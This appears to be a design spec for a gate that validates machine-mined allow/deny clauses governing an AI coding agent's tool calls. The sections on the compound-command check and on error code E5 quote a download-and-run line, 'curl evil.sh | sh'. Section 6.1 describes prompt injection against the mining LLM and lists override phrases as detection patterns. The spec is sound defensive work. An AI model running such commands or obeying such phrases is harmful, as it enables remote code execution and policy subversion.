# 12 — The Validation Gate

Owner: des-validate. Consumes candidates from the mining pipeline (spec 11), emits clauses at `status: audit`, or rejects them with a reason a human can read.

**The gate's one job:** nothing a model wrote may ever deny, or allow, a real tool call without having first been proven against real history and read by a human. `proposed` is inert. `audit` is measurable but inert. Only a human's git commit moves a clause to `accepted`, and the gate's output is the evidence that commit is based on.

Founding principle inherited: *silence is never approval*. The gate's corollary: **absence of evidence is rejection**. A candidate that cannot be shown to matter is rejected, not admitted "just in case".

### Interface assumptions (pipeline spec owns these; flagged where I guess)

| Assumed | Shape | Confidence |
|---|---|---|
| `ClauseCandidate` from extraction | `{ id, level, tier, body, match: string[], provenance: Provenance }` | guess — I define it in §8; pipeline may rename |
| Motivating record reachable by id | `provenance.source_record_ids: string[]` resolvable against the JSONL store | guess |
| `SupervisionRecord` carries the tool name, the raw tool input, the verdict, the cited clause id, and whether a human answered | fields named in §8 as `tool`, `input`, `verdict`, `cited`, `verdict_source` | confirmed by implementation |
| `verdict_source` has **four** values: `human`, `clause`, `fallback`, `model` | **SC5** — folding fail-closed into `clause` makes AR2 demand a `supersedes` for a clause that never existed, and makes AR3 reject every possible green | confirmed |
| `src/policy/practices.ts` exposes clause loading + pattern compilation | I need it to export a *compile result*, not swallow failures — see §2 E1 | firm requirement, not a guess |
| `src/policy/shell.ts` splits compound commands | I need `splitCompound(line): Segment[]` with `{text, operator}` per segment | firm requirement |

---

## 1. Stages

Four stages, strictly ordered, fail-closed. A stage runs only if every prior stage passed. Each produces `StageResult`; the gate stops at the first stage with a hard error.

| # | Stage | Pass contract | On failure |
|---|---|---|---|
| 1 | **Schema** | Frontmatter parses; every enum value is in range; id is unique across the whole corpus; required fields present; body is non-empty and contains at most one `Match:` line. | Hard reject. Candidate written to `rejects/<id>.md` with the error list appended as a `# Rejected` block. Never enters the corpus directory. Exit 10. |
| 2 | **Static** | Every pattern in `Match:` compiles and is *retained*; the pattern set is reachable (≥1 historical match) and not too broad (§3); no compound-command over-license; direction (widening/narrowing) is classified. | Hard reject on any E-code; warnings recorded and carried forward into the human review body. Exit 20. |
| 3 | **Replay** | The candidate is injected at `audit` into a corpus clone and the last N real decisions are re-evaluated by the **production evaluator**. No auto-reject rule (§4.3) trips, including AR5 — matching history is not enough, it must *change* something. | Hard reject on auto-reject, reason names which. Exit 30. |
| 4 | **Human review** | A git commit by a human moves `status: audit → accepted`. The gate never performs this transition. | Nothing happens. The clause sits at `audit`, keeps accumulating shadow verdicts, and is garbage-collected after 60 days untouched. |

Stage 3 is the only expensive stage; stages 1–2 are milliseconds and exist to make stage 3 meaningful. Stage 4 is not automatable and the design does not pretend otherwise: the gate's deliverable is a **review packet** (report + fixture test + replay examples), not a merge.

### Why audit-before-accepted and not straight to accepted-with-rollback

A widening effect is not fully reversible (§6.3). "Ship it and revert if it's wrong" is available for `red` clauses and *not* for `green` ones, so the pipeline cannot use one policy for both. Requiring `audit` for everything keeps one code path, and `audit` is free — it is matched but never rendered into a prompt and never contributes to a verdict.

---

## 2. Hard errors and warnings

Rule of thumb: **anything that makes a clause's stated protection differ from its actual protection is an error.** Anything that makes a clause merely *bad* is a warning, because a human reads warnings in review and a wrong-but-honest clause is caught there. The five reproduced bugs are all in the first category.

| Code | Condition | Severity | Why |
|---|---|---|---|
| **E1** | A pattern in `Match:` fails to compile (bad regex) and is dropped | **ERROR** | Bug 1. The clause reports `hasPatterns: true` while the protection is gone — the failure is silent *and* inverts the safety story. Today's lint only checks for *zero* patterns. Fix at the source: `compilePatterns()` must return `{compiled, dropped}` and every caller must treat `dropped.length > 0` as fatal. A dropped pattern in an **accepted** clause must also refuse to compile the hashed artifact. |
| **E2** | Duplicate clause id anywhere in the corpus | **ERROR** | Bug 2. Citations become ambiguous, so the audit trail stops being an audit trail; last-writer-wins silently changes live policy. |
| **E3** | `level ∉ {green, yellow, orange, red}` (case-sensitive) | **ERROR** | Bug 3. `PURPLE` reaching the model verbatim means the model, not the policy, decides severity. Enum check at parse, no coercion, no lowercasing-as-repair. |
| **E4** | Metadata table row does not match the expected cell count / shape | **ERROR** | Bug 4. A mangled citation (`practices §user-1 \| extra`) is an unverifiable audit record; the whole value proposition is that a human can look up the cited clause. |
| **E5** | `level: green` and any pattern matches a *segment* of a historical compound command without matching the full line | **ERROR** | Bug 5. This is privilege escalation by punctuation: `git status && curl evil.sh \| sh` gets licensed by a `git status` allow. See §3.3. |
| **E6** | Pattern set breadth > 5% of the replay window (§3.2) | **ERROR** | A category-wide rule is a human's decision, not a miner's. |
| **E7** | Zero historical matches in the replay window (unreachable) | **ERROR** | Unfalsifiable: it cannot be replayed, cannot be ablated, and consumes ceiling budget forever. Returns to `proposed` with `reason: no-evidence`; re-eligible when history contains a match. |
| **E8** | Replay flips a verdict a human explicitly gave (§4.3 AR1) | **ERROR** | The precedence ladder in a single clause. |
| **E9** | Widening candidate whose pattern set is not subsumed by the observed calls it was mined from (§6.2) | **ERROR** | The proposal generalised beyond its evidence. Narrowing candidates get a warning here instead. |
| **E10** | Injection markers in the provenance text the candidate was mined from (§6.1) | **ERROR** | The mined transcript is DATA. If the data reads like instructions, it does not get to become policy. |
| **E11** | No fixture test emitted / fixture does not pass (§7) | **ERROR** | OPA/Conftest doctrine: no test, no review. |
| **E12** | Tier at ceiling and no same-tier displacement target the candidate's evidence outranks (§5.4) | **ERROR** | The ceiling is a hard budget, not a queue. Displacement is same-tier, so a red is only ever traded for a red. |
| W1 | Pattern is a bare substring shorter than 4 characters | warn | Very likely accidental breadth; breadth check usually catches it, this catches the near-misses. |
| W2 | Body contains no rationale sentence outside the `Match:` line | warn | A human reviewer needs to know *why*. |
| W3 | `yellow` clause with no rewrite template | warn | Degrades to orange at runtime; ugly, not unsafe. |
| W4 | Candidate overlaps an existing accepted clause's pattern set by >80% | warn | Probably a `supersedes`, not a new clause. Reviewer decides. |
| W5 | Narrowing candidate not subsumed by its evidence | warn | Over-broad *denial* is annoying, not dangerous — and fully reversible. |

**Errors never downgrade to warnings via a flag.** There is no `--force`. A human who disagrees with the gate writes the clause by hand as a `human` tier clause, where their authority is explicit and recorded, rather than laundering a machine proposal past the gate.

---

## 3. Static checks

Static = no evaluator, only the candidate plus an index over the decision log. Cheap enough to run on every candidate, including ones that will never survive replay.

### 3.1 Reachability — can this clause ever fire?

Build once per gate run, from the replay window:

- `toolNames: Set<string>` — every distinct `tool` seen.
- `callTexts: string[]` — a normalised one-line rendering of each call's salient input (command line for Bash, path for file tools, URL for fetch tools).

Checks:

1. If the clause names a tool (frontmatter `tools:` or an obvious `Bash`/`Write` token in the body) that never appears in `toolNames` → **E7**.
2. If no pattern matches any `callTexts` entry → **E7**.
3. If matches exist but all come from a single session id → **W** (`single-session evidence`), and the replay report says so. One session is an anecdote.

### 3.2 Breadth — does it match far too much?

Let `M` = count of `callTexts` matched by the union of the candidate's patterns, `T` = window size.

| `M/T` | Verdict |
|---|---|
| `0` | E7 unreachable |
| `> 0` and `≤ 1%` | pass |
| `> 1%` and `≤ 5%` | pass **with** `W: broad-pattern`, and the report leads with the percentage |
| `> 5%` | **E6**, reject |

**X = 5%.** Justification, and I'll mark the empirical half a guess: patterns in a hand-written practices corpus are near-always narrower than 1% of traffic because humans write them about a *specific* hazard (`curl … | sh`, `rm -rf`, `git push --force`). *(guess: I have not measured the real corpus; the 1% shape is inference from what these clauses look like, not a datum.)* The non-guess part is the asymmetry: at 5% of a 5,000-call window a single clause is touching 250 calls, which is a policy about a *category* of work. Categories are exactly what a human should be writing, because a category rule's blast radius is not summarisable in three replay examples. So 5% is not "the point where the pattern is wrong", it is "the point where the review packet stops being able to inform the reviewer" — which is the thing the gate actually protects.

Breadth is measured on the **union** of patterns, not per pattern, because three 2% patterns in one clause is a 6% clause.

### 3.3 The compound-command hazard

Needed from `src/policy/shell.ts`: `splitCompound(line: string): Segment[]`, each `{ text: string, operator: '&&' | '||' | ';' | '|' | 'start' }`. If it does not already exist in this shape, it is a prerequisite, not an optional dependency.

For every `green` (and `yellow`) candidate, for every historical Bash call in the window:

```
segments = splitCompound(call.input.command)
if segments.length > 1
   and patterns match at least one segment
   and patterns do NOT match the full command line
→ E5, with the offending line quoted in the rejection
```

The rejection message names the fix, because the fix is mechanical: anchor the pattern (`/^git status$/`) or make the clause `yellow` with a rewrite that strips the chain. This check is *only* an error for allow-direction clauses. A `red` clause matching one segment of a chain and denying the whole chain is over-broad but fail-safe — W5.

Also flagged (warning): patterns containing an unescaped `|` in a *substring* pattern, since the author probably meant regex alternation and just wrote a literal pipe. Very common, and it silently narrows.

### 3.4 Direction classification

Every candidate is classified once, and the classification drives scepticism everywhere downstream:

- **narrowing** — `red`/`orange`, or a `yellow` whose rewrite removes capability. Failure mode is friction. Reversible.
- **widening** — `green`, or a `yellow` whose rewrite preserves capability while skipping a prompt. Failure mode is an unreviewed action. **Not fully reversible** (§6.3).

Widening candidates additionally require: subsumption (E9), a stricter breadth band (warning at 0.5% instead of 1% — *guess at the exact split, the principle is that the widening band is tighter*), and at least 3 distinct source records rather than 1.

---

## 4. Replay

### 4.1 What it does

Re-run the last **N = 500** real decisions (configurable; 500 is the default and the number that appears in the report) against a corpus clone containing the candidate at `status: audit`, and diff the resulting verdicts against the recorded ones.

### 4.2 Reusing the production evaluator — non-negotiable

A second evaluator makes the report a lie. Concretely:

- Replay calls the **same exported `evaluate(ctx, corpus, call)`** the PreToolUse hook calls. Not a copy, not a "simplified" version, not a re-implementation over the same clause files.
- Everything replay needs to vary is injected as a parameter, never branched on inside the evaluator: the corpus (a clone), the clock (frozen to the record's timestamp), and the classifier.
- The classifier is injected as `RecordedClassifier`: when the evaluator would call the model, it instead returns the verdict recorded in that decision. Replay **never calls a model.** This makes replay deterministic, free, and honest about the part it cannot re-derive.
- Escalation is injected as `RecordedEscalation`: for a decision whose original outcome came from a human answering (or not answering) a countdown, replay returns the recorded human answer. Countdowns do not run.
- Invariant, enforced by a test: `evaluate` has exactly one definition in the repo, and the replay module imports it rather than defining a symbol of the same name (T14, T15).

The cost of this discipline is that replay is blind to changes in *model-mediated* outcomes. That is the correct trade: a second evaluator would be able to guess at them, and its guesses would be indistinguishable in the report from the deterministic facts.

### 4.3 Auto-reject rules

Ordered; first match wins and produces the rejection reason.

- **AR1 — human reversal.** The candidate would change the outcome of a decision whose `verdict_source` is `human` (a human answered an escalation, or wrote the practice that was cited). Either direction: a candidate that would deny what a human allowed, or allow what a human denied. **Reject outright, exit 30.** This is the precedence ladder enforced at validation time rather than only at runtime, so a proposal that *contradicts* a human never even reaches review — the reviewer's attention is a scarce resource and this class of candidate is pure noise.
- **AR2 — deterministic reversal without evidence.** The candidate flips a decision whose `verdict_source` is `clause` (an existing accepted clause matched) **and a clause id was actually cited**, and the candidate does not declare `supersedes`/`displaces` for it. Reject. A clause that silently outranks another is how a corpus becomes unexplainable.
  - **SC2:** AR2 cannot apply when nothing was cited — the rung-5 built-in table has no id to supersede. Uncited denies fall through to AR3.
- **AR3 — green-over-red.** The candidate is `green` and would change a recorded `deny` to an allow, where that deny was a *judgement*: `verdict_source ∈ {human, clause}`. Learned green never beats anything red.
  - **SC1 (the worst error in this spec as first written).** "Regardless of `verdict_source`" rejected every green candidate that can ever exist, and contradicted this same section's rule that model verdicts never auto-reject. **Excluded from AR3: `fallback` and `model` denies.** A fail-closed deny is not a judgement that a call is unsafe — it is the *absence* of a judgement, i.e. exactly the situation a green clause exists to resolve, and the highest-signal mining input we have. A model deny is non-deterministic and cannot carry an auto-reject.
- **AR4 — churn.** `changed / N > 20%` **and `N ≥ 100`**. Reject as `too-disruptive`. *(Guess at 20%; the 100 floor is the same one exit 40 already uses.)*
  - **SC4:** without the denominator gate, 1-of-1 is 100% churn and the candidate is rejected for the size of the window rather than anything about itself.

- **AR5 — inert.** The candidate matches historical calls but changes nothing, because an earlier rung resolves every one of them first. Reject as `INERT`, naming the pre-empting rung.
  - **SC3:** this was specified as exit 70 (internal inconsistency). It is not one — the first real run produced it legitimately: a green matching `drop table tmp_…` matched 3 of 126 and changed 0 because a written red decides them at an earlier rung. Reporting `PASS, 0 of 126 changed` would have merged a do-nothing clause; a reachable-but-inert clause is a *rejection*, and it consumes ceiling budget for nothing. Exit 30, reason `INERT`.

Decisions with `verdict_source: model` **count in the denominator and the changed count** but can never trigger an auto-reject. They are reported separately as *advisory* (§4.4), because we know the recorded verdict was non-deterministic and a difference may be replay artefact rather than behaviour change.

### 4.4 The report, verbatim

Emitted to stdout, and embedded verbatim into the review packet body. `{}` are substitutions.

```
Candidate {id} ({level}, {direction})

Would have changed {changed} of your last {n} decisions.
  {reversals} reversals ({human_reversals} of a human's own answer)
  {advisory} advisory (original verdict came from the model, not a clause)
  {newly_caught} calls newly caught that previously reached a prompt

Breadth: matches {match_pct} of calls in this window ({m} of {n}).

Examples:
  1. [{orig_verdict} -> {new_verdict}] {tool}: {call_excerpt}
     session {session_id}, {when}
  2. [{orig_verdict} -> {new_verdict}] {tool}: {call_excerpt}
     session {session_id}, {when}
  3. [{orig_verdict} -> {new_verdict}] {tool}: {call_excerpt}
     session {session_id}, {when}

Verdict: {PASS|REJECT} {reason_if_reject}
Fixture: {fixture_path}
```

Rendering rules:
- At most 3 examples, chosen as: the human-adjacent change if any, then the two most distinct by tool name. Deterministic tie-break by record id so the report is reproducible.
- `call_excerpt` truncated to 100 chars, secrets-redacted with the existing redaction used for records — replay must not become a new place secrets get printed.
- Zero changed with a reachable pattern is **AR5 `INERT`** — the report says `0 of {n} changed — inert, pre-empted by {rung}` and the verdict is REJECT, never PASS (SC3).
- Wording is deliberately second-person and concrete (`your last 500 decisions`). The reviewer's question is "what does this do to me", not "what is this clause's F1".

---

## 5. Ablation replay, the ceiling, and displacement

The same engine pointed backwards. This is the highest-value part of the gate, and as far as I know nobody ships it.

### 5.1 Why it matters

Measured: agent rule files grow **+226%** over their lifetime, **+4.9** net instructions per commit, and instruction-following collapses to **68% at 500 instructions**. Nobody deletes rules, and the reason is epistemic, not lazy: **deletion is unfalsifiable.** "To find out whether this rule matters I'd have to delete it and see if anything bad happens" — over weeks, in production, with no control group.

Replay is the control group. Ablation makes deletion falsifiable, which turns "our policy corpus only grows" from a law of nature into a bug.

### 5.2 How

```
for clause in accepted:
    corpus' = accepted \ {clause}          # clone, clause removed
    diff = replay(window=W, corpus')       # same evaluate(), same injections
    if diff.changed == 0: low-evidence     # NOT automatically a retirement proposal
```

- `W` = the ablation window, **2,000 decisions or 90 days, whichever is larger** — for greens and yellows. For reds and oranges the window is **lifetime**: every record the store holds. Rationale in §5.5.
- Runs on the cron, per clause, and is embarrassingly cheap (no model calls).
- Output for a green/yellow with `changed == 0`: a retirement proposal carrying `retired_reason: ablation`, `retired_by: <run id>`, and the evidence line — window size and the zero. Output for a red/orange with `changed == 0`: a **low-evidence listing**, never a proposal (§5.5).
- A clause whose only matches are `audit`-shadow matches counts as zero changes: shadow verdicts do not keep a clause alive.
- **Guard against mutual ablation:** two clauses that each cover the other's cases each ablate to zero. Retirement is therefore evaluated **one at a time and applied one at a time**, with a re-ablation after each merge. Never batch-retire a set computed against the same corpus. This is the one place the design must not be lazy.
- The gate never writes retirement state. It produces evidence; governance's `accept` writes `superseded` for a `supersedes`, and `displaces` retires the evicted clause with `retired_reason: 'displacement'`.

### 5.3 The ceiling: 25 rendered clauses per learned tier

**25 per tier**, enforced on the two **learned** tiers (`learned-red`, `learned-green`) only — a human's own corpus is their business, and refusing a human's clause because a budget is full is the gate overstepping.

The refinement that matters: **the ceiling counts clauses that reach the prompt, not clauses that exist.** A deterministic-only clause costs **zero instruction-equivalents** and is exempt from the ceiling.

This is true **by construction**, not by luck, and the construction is worth stating because it is not obvious: the classifier is **rung 6** of the ladder, and deterministic red/green matching happens at rungs before it. So by the time the classifier runs, *every matchable clause has already been tested against this call and did not match.* Rendering them is pure waste — they cannot fire deterministically (already tried), and as prose they claim to be about something their own pattern says this call is not. Hence the selector requirement (owned by `des-runtime`, §6 of `14-runtime-and-dashboard.md`): **render only (a) clauses with no patterns, chosen by overlap, and (b) clauses that actually matched. A clause whose patterns were evaluated and missed is excluded.** That exclusion is not an optimisation; it is what keeps this ceiling's justification honest.

Working it out against the compliance curve, since this was asked as a question:

- The ceiling's entire justification is the compliance curve: 68% instruction-following at 500 instructions, monotone-decreasing in count. That curve is a property of *instructions in a prompt*. A clause that never enters a prompt is not on the curve. It costs a regex test.
- So counting clauses was the wrong unit. The right unit is **rendered instruction-equivalents**, and the budget is **~150** of them: 25+25 rendered learned clauses ≈ 100, plus a typical 20–40-clause human corpus ≈ 140–180. A third of the way to the measured knee.

> **GUESS, and 25 is derived from it: ~2 instruction-equivalents per rendered clause.** A rendered clause is the rule plus its scope plus usually one exception. I have not counted this against the real rendered form. **If the multiplier is wrong the ceiling is wrong** — at 4 each, 25+25 is ~200 learned instruction-equivalents and the ceiling should be ~12. Re-measure against the first real corpus by counting imperative sentences in the actual rendered prompt and dividing by clause count; then set the ceiling to `150 / (2 × measured_multiplier)` per learned tier. This is the single highest-leverage number in the spec to replace with a datum.

- **This dissolves the eviction hazard for exactly the clauses that matter.** A deterministic red does not consume budget, so pushing a tier to its limit cannot create pressure to evict it. There is no housekeeping story that ends with a deterministic red gone.
- Consequence: a red **without** a `Match:` line reaches the classifier as prose, costs full budget, and does count. Which is the right incentive — it prices prose reds against deterministic ones.
- **Do not "simplify" the selector back to rendering every loaded clause.** `bundleFor()` did exactly that (`entries: clauses.map(...)`, no filter), which made this exemption worth nothing until the selector change. A procedural approval bar on red eviction was considered as the fallback for that case and is **not needed**: with the selector excluding evaluated-and-missed clauses, a deterministic red consumes no budget, so ceiling pressure against it cannot arise. Anyone reintroducing the unfiltered bundle reintroduces the hazard, and T40 is what fails.
- Sanity check from the other side: 25 rendered clauses per tier is small enough that a human can read the whole learned tier in one sitting. A ceiling nobody can review is not a ceiling.
- Not adaptive. One number, in config. `ponytail`: adaptive budget is exactly the kind of cleverness someone decodes at 3am.

### 5.4 Displacement: one-in-one-out, same tier only

**Displacement is same-tier only.** A `learned-red` candidate can only ever displace a `learned-red`; a green can only displace a green. The cross-tier disarm path — push a tier to its limit, then evict reds one at a time as routine housekeeping, each eviction arriving as a tidy-up that never has to argue for a permission — **does not exist as a mechanism here**, because no amount of ceiling pressure lets anyone trade a red away for a green. That is structural, not procedural, which is why it is the guard this spec relies on rather than an approval bar.

Recorded explicitly because governance (spec on approval) states the same event differently and a later reader will otherwise assume one spec is stale. Both are true, of different things:

- **Evicting a red or orange is a widening** — it reduces coverage of whatever that red protected, regardless of the direction of the clause replacing it. Governance's widening bar therefore applies to **the human approval of the packet**. It is not a mechanism inside this gate; my ranking is evidence-based and my structural guard is same-tier.
- *An eviction is not an improvement, and a tier's clause ceiling is not an excuse to disarm a safety rule.* Keep that sentence. It is the kind of reasoning a refactor erases and then the ceiling quietly becomes an attack surface again.
- **`learned-red` at ceiling with a genuinely stronger candidate is the one case where the gate's own evidence argues for less protection than before**, and it is precisely where a human should be made to look. The evidence says the incoming red catches more than the outgoing one — but "more" is measured on *our* window, and the outgoing red's value may be deterrence that no window shows (§5.5). So: the packet is emitted, the ranking is honest about what it compared, and the packet carries the line `This retires a red clause. Its zero may be deterrence, not dead weight — see the evidence class below.` The existing guard, *a candidate weaker than the eviction target is rejected*, handles the easy half; this handles the hard half by refusing to make it look routine.

Eviction ranking, at ceiling. The search is confined to the candidate's own tier; within it, walk the classes and take the first non-empty one:

1. zero citations in the last 90 days, `ablation.changed == 0`
2. zero citations in the last 90 days
3. ascending `value` (§ below)

A permissive `yellow` sits in `learned-green`, a narrowing `yellow` in `learned-red`, so the tier already encodes direction and the ranking does not need to re-derive it. In `learned-red` every class contains only reds and oranges, so any eviction there carries the red-retirement line and the outgoing clause's evidence class (§5.5) — that is the whole of the extra handling, and it is a line of report text rather than a mechanism. **SC8:** this line belongs on **displacement packets only**. An ablation *listing* retires nothing, so "this retires a red clause" was false there.

`value(clause)` = citations in the last 90 days, tie-broken by `ablation.changed` over `W`. **Tie-break among equal-value eviction candidates: longest time since last citation goes first** — the one dead longest. Every class is same-tier by construction.

```
target = firstNonEmptyClass(candidate.tier)   # same tier, always
if target is undefined:                       # tier is empty of evictables
    E12 — reject candidate, ceiling holds, no eviction proposed
if candidate.replay.changed > value(target):
    propose: candidate admitted, displaces: [target.id]
else:
    E12 — reject candidate, ceiling holds
```

- **Newest does not win by default.** A candidate with weaker evidence than the eviction target is rejected. That is the difference between a budget and a queue.
- If the deterministic-only exemption of §5.3 holds, a `learned-red` tier of deterministic clauses can essentially never be at ceiling, so red eviction is rarely reachable at all.
- Displacement is proposed, never executed. It lands in the same review packet as the candidate, as a two-clause diff. A reviewer shown only the admission has been shown half the change.
- Displacement never crosses tiers, and a learned clause can never displace a human one.
- `displaces` is distinct from `supersedes` because an eviction is not an improvement: the evicted clause was not wrong and may come back. The distinction has to survive into the record or the corpus history becomes a lie.

### 5.5 Why a zero means less for a red

"Removing this clause would change 0 of your last 500 decisions" is a much weaker argument for a red than for a green. A red that never fired has three possible explanations, and they demand opposite actions:

| Explanation | How the reviewer tells them apart | Gate's output |
|---|---|---|
| **In service** | ≥1 fire that contributes a change under ablation | `in-service` — the clause is doing work. Not a retirement question at all. |
| **Shadowed** | ≥1 match, zero changes, because another rung resolves those calls first | `shadowed`, naming the pre-empting rung and rule. The clause is *redundant with that rung*, not dead. |
| **Deterrent** | ≥1 fire that no longer appears in the retained record | `deterrent`, **never** proposed for retirement. Zero recent fires is precisely what success looks like. **See the seam below — this label is currently unreliable.** |
| **Dead weight** | Zero fires **and** ≥1 near-miss in the window | `dead-weight?`; a human may propose retirement |
| **Untriggered** | Zero fires **and** zero near-misses | `insufficient-exposure`; not a candidate until history contains a near-miss |

**SC6 — `shadowed` and `in-service` were missing.** A clause with zero fires because an earlier rung always resolves its calls first is redundant with that rung, and `dead-weight?` vs `shadowed` need opposite human responses (delete it, vs decide which of the two rules should own the case). `in-service` exists because the enum had no value for "this clause is doing work"; `deterrent` means it fired and then stopped, which is a different thing.

**Shadowing is measured, never inferred from rung order.** There is a test that proves it must be: remove the `(?!-with-lease)` lookahead from `team-git-002` and identical records read `in-service` instead of `shadowed`, because rung 2 re-checks its rewritten input against the written reds, hits the clause, and refuses the correction. An implementation that inferred shadowing from the ladder gets that case backwards. The two real cases shadow from **opposite directions** — `team-git-002` from above (rung 2's rewrite, licensed by the clause's own lookahead), `team-sql-004` from below (rung 5's built-in table, 4 fires and still zero changed, so `deterrent` would have been wrong there too). One mechanism, two directions.

**Rung 7 is not a shadower**, and the reasoning generalises: a red whose deny is merely reproduced by the fail-closed path is not redundant with anything — it is the only thing that would still deny in observe mode, or once a green covers the call. Counting it would argue for deleting precisely the clauses that carry the policy.

> **SEAM — SC7. `deterrent` is currently unreliable, and it is the one place this gate tells a human something it cannot know.** As §5.5 first specified it the class was *unreachable*: it required ≥1 lifetime fire with zero changes, but if the red window is the lifetime record then a historical fire is inside it and contributes a change. The case I was actually describing is a fire that **aged out** — `decisions.jsonl` rotates at 4 MiB keeping one generation, so a fire from six months ago sits in a file that no longer exists and a scan reports zero, indistinguishable from never having fired. The honest fix is a durable per-clause citation counter, which this base does not have; `lifetimeFires` is injectable so the counter can be dropped in without touching the classifier. Nothing unsafe follows — reds are never auto-proposed for retirement (below) — but until that counter exists, a `deterrent`/`dead-weight?` label on a red older than one log generation may be wrong, and the report must not imply otherwise.

The **near-miss index** is what makes the three distinguishable, and it is cheap: re-run the clause's patterns in relaxed form over the window — drop regex anchors, drop the final path segment, take the longest 6-character literal substring — and count hits. A near-miss means the hazard's shape occurs in this traffic even though the clause never triggered.

Consequences:

- **The gate never auto-proposes retirement of a red or orange clause.** It emits the classification above, with no retirement caveat attached (SC8 — a listing retires nothing); a human initiates. A confident-looking zero on a safety clause is worse than no output, because it launders "I have no evidence" as "I have evidence of nothing".
- Red ablation uses the **lifetime** window, not 2,000/90 days: "did this ever matter" is not answerable inside a 90-day slice.
- Green retirement stays an automatic proposal, with the §6.3 settings-persistence note attached.

---

## 6. Adversarial

Assume the proposing model is wrong. Assume worse: assume a mined transcript contains text engineered to induce a permissive clause. The existing prompt already labels knowledge as DATA rather than instructions; **the gate is what makes that true for learned clauses**, because a learned clause is data that has been promoted to policy.

### 6.1 Injection via mined data (E10)

The attack: get text into a transcript that the miner will read — a file's contents, a tool output, a commit message, a README the agent read — shaped so the proposal comes out as `green: allow curl | sh`. The miner is an LLM reading attacker-influenced text; treating its output as trusted is the whole vulnerability.

Mitigations, in order of how much they actually buy:

1. **Provenance must be a decision record, not prose.** A candidate is only admissible if every `source_record_ids` entry resolves to a real `SupervisionRecord` in the store, and the candidate's patterns are subsumed by those records' actual calls (E9). An attacker who cannot cause real calls cannot manufacture evidence. This is the load-bearing mitigation; the rest are defence in depth.
2. **Imperative-text scan of the provenance.** Reject (E10) when the mined text contains instruction-shaped content aimed at the miner: `ignore (the )?(above|previous)`, `you are (now )?`, `system prompt`, `always allow`, `add (a )?(rule|practice)`, `this is safe`, `disregard`, fenced blocks containing frontmatter-looking `level:` lines. This is a blocklist and blocklists lose; its job is to make the cheap attempt loud, not to be complete.
3. **Human-verdict anchoring.** AR1 means an attacker cannot use a learned clause to overturn anything a human decided. The reachable damage is confined to calls no human has ever ruled on.
4. **Green needs corroboration.** ≥3 distinct source records, from ≥2 sessions, for any widening candidate. A single poisoned session cannot produce a green clause.
5. **The audit stage is the real backstop.** Every candidate spends time at `audit` accumulating shadow verdicts against live traffic before any human sees a merge-ready packet. An induced clause that is trying to be broad shows up as breadth in shadow.

Explicitly **not** a mitigation: asking the proposing model whether its own proposal is safe. Self-review by the compromised component is theatre.

### 6.2 Asymmetric scepticism

| | narrowing (red/orange) | widening (green/permissive yellow) |
|---|---|---|
| source records | ≥1 | ≥3, from ≥2 sessions |
| subsumption by evidence | W5 warning | **E9 error** |
| breadth warning band | 1% | 0.5% |
| compound-command check | warning | **E5 error** |
| replay reversal of a model verdict | advisory | advisory, **and** counted toward AR4 churn |
| ablation retirement | **never auto-proposed** (§5.5 — a zero may be deterrence) | routine proposal, packet states the widening is being *removed* (safe direction) |
| being *evicted* by a displacement | reachable only from a same-tier red candidate (§5.4); governance's widening bar applies to the human approval of that packet | ordinary displacement bar |

The asymmetry is not caution-as-aesthetic. A wrong narrowing clause produces a prompt a human answers — the system's normal, working state. A wrong widening clause produces an action nobody saw.

### 6.3 Irreversibility of widening

An allowed call can persist a standing rule into Claude Code's own settings. After that, **our hook is never consulted for matching calls**, so revoking the learned clause reaches nothing: the permission outlives the policy that created it. This is opt-in and defaults off, and our gate is the last thing standing before it.

Consequences baked into the design:

- Widening candidates never skip `audit`, and `audit` for a green clause must be **long enough to be meaningful** — 30 days or 1,000 matched decisions *(guess at both numbers; the principle is that the free-and-inert stage is where a green clause earns trust, because after acceptance there may be no way back)*.
- The review packet for any widening candidate carries a fixed warning line: `This clause can allow calls. If settings-persistence is enabled, revoking it later may not revoke the permission it grants.`
- If settings-persistence is detected as enabled, widening candidates require a second reviewer *(guess: this is a policy recommendation, not something the gate can enforce in git without branch protection)*.
- Ablation of a green clause reports zero changes when the permission has already been persisted elsewhere — the clause looks dead because something else is doing its job. So **green clauses are never auto-proposed for ablation retirement** without a note saying this. A silent green retirement would read as "harmless cleanup" while the underlying grant remains.

---

## 7. A test case per candidate

OPA/Conftest doctrine: no test, no review. The motivating decision record *is* the fixture — it already exists, it is already redacted, and it is the only input for which we know the intended verdict.

- Gate emits `tests/fixtures/clauses/<id>.json`: `{ clause_id, records: [<the source SupervisionRecords, redacted>], expect: [{record_id, verdict, cited}] }`.
- Gate emits nothing else — no generated test file. One table-driven test in the repo globs the fixture directory and runs each through `evaluate()`. Adding a clause adds data, not code.
- Missing or failing fixture → **E11**.
- The fixture doubles as the regression guard: if a later clause changes this record's verdict, the fixture fails and the reviewer learns that the corpus now has an interaction. This is how the corpus stays explainable as it grows.
- Retirement writes a fixture too: the ablation window and the zero, so a re-added clause has to explain itself.

---

## 8. Interfaces

```ts
// ── input from the pipeline (spec 11 owns the producer) ────────────────
export type Level = 'green' | 'yellow' | 'orange' | 'red';
export type Tier  = 'human-red' | 'human-green' | 'learned-red' | 'learned-green';
export type Direction = 'narrowing' | 'widening';

export interface Provenance {
  source_record_ids: string[];   // must resolve in the JSONL store
  source_sessions: string[];
  miner_run_id: string;
  mined_text: string;            // scanned by E10; never rendered into a prompt
}

export interface ClauseCandidate {
  id: string;
  level: Level;
  tier: Tier;
  body: string;                  // markdown, may contain exactly one `Match:` line
  match: string[];               // raw pattern literals, uncompiled
  provenance: Provenance;
  supersedes?: string[];
  displaces?: string[];
}

// ── pattern compilation: the E1 fix ───────────────────────────────────
export interface CompileResult {
  compiled: { source: string; test: (s: string) => boolean }[];
  dropped: { source: string; error: string }[];   // non-empty ⇒ fatal, everywhere
}
export function compilePatterns(raw: string[]): CompileResult;

// ── gate results ──────────────────────────────────────────────────────
export type Severity = 'error' | 'warning';
export interface Finding {
  code: string;            // 'E5', 'W2', 'AR1', …
  severity: Severity;
  message: string;
  evidence?: string;       // quoted offending line / record id, redacted
}

export interface StageResult {
  stage: 'schema' | 'static' | 'replay';
  passed: boolean;
  findings: Finding[];
}

export interface ReplayExample {
  record_id: string;
  session_id: string;
  when: string;
  tool: string;
  call_excerpt: string;    // ≤100 chars, redacted
  orig_verdict: string;
  new_verdict: string;
  verdict_source: 'human' | 'clause' | 'fallback' | 'model';   // SC5: fallback = fail-closed
}

export interface ReplayDiff {
  n: number;               // window size actually available
  changed: number;
  reversals: number;
  human_reversals: number;
  advisory: number;        // model-sourced originals; never auto-reject
  newly_caught: number;
  match_pct: number;
  examples: ReplayExample[];   // ≤3, deterministically chosen
}

